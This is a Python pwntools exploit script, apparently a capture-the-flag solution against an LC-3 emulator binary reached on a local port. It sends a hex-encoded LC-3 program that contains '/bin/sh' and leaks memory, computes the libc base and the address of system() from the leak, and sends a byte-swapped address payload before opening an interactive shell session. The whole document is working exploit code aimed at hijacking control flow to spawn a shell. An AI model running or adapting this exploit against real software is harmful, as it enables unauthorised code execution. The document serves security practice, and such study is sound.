#!/usr/bin/env python3

from pwn import *
context.terminal = ['tmux', 'split-window', '-h']
context.gdb_binary = 'pwndbg'

exe = ELF("./lc3emu_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("127.0.0.1", 50000)

    return r


import os

def main():
    r = conn()

    #os.system("python lc3-asm/lc3.py exploit.asm")

    hexprogram = "3000e418126a1241126960801a2014a1608010001000100010001000100010001000100570c014a116e1127f03eef112e044c000002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020002500700020000a0000002f00620069006e002f0073006800005020526054a056e059205b60e5f1126a124112411241124160801a2014a1608010001000100010001000100010001000100570c014a116e1127f03eef020182019041904190419041904190419041904f0201900f0201a201b451b451b451b451b451b451b451b45f0201a05f0201c201d861d861d861d861d861d861d861d86f0201c06f020162016c316c316c316c316c316c316c316c3f02016031ee01120136015a017e0f100e1ffc000f025"

    program = b""

    # with open("exploit-out.obj", "rb") as f:
    #     program = f.read()

    program = bytes.fromhex(hexprogram)

    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Enter program as hex: ")
    r.sendline(program.hex().encode())

    addresses = r.readline().decode().split(" ")
    libc_base_addr = 0
    for i in addresses:
        if i.endswith("70a"):
            libc_base_addr = int(i, 16) - 0x7e70a
            print(i)



    system_addr = libc_base_addr + 0x53110
    log.info(f"libc leak: {hex(libc_base_addr)}")
    log.info(f"system leak: {hex(system_addr)}")

    paddr = p64(system_addr)

    payload = bytes([paddr[1], paddr[0], paddr[3], paddr[2], paddr[5], paddr[4], paddr[7], paddr[6]])

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
